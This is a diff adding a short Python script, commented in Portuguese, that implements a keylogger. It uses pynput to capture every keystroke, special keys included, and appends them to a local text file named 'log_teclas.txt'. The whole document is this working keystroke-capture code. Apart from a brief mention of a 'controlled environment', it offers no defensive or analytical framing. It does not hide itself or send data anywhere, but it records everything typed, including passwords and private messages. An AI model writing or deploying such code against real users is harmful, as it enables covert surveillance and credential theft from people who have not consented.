@@ -1,0 +1,23 @@
+import pynput.keyboard
+
+# Onde as teclas serão salvas
+log_arquivo = "log_teclas.txt"
+
+def ao_pressionar(tecla):
+    try:
+        # Tenta pegar a tecla normal (letras, números)
+        tecla_str = str(tecla.char)
+    except AttributeError:
+        # Se for tecla especial (Espaço, Enter, etc)
+        tecla_str = f" [{tecla}] "
+
+    with open(log_arquivo, "a") as f:
+        f.write(tecla_str)
+
+def iniciar_keylogger():
+    print("Keylogger iniciado... Pressione Ctrl+C para parar (em ambiente controlado).")
+    with pynput.keyboard.Listener(on_press=ao_pressionar) as listener:
+        listener.join()
+
+# Para rodar:
+# iniciar_keylogger()+
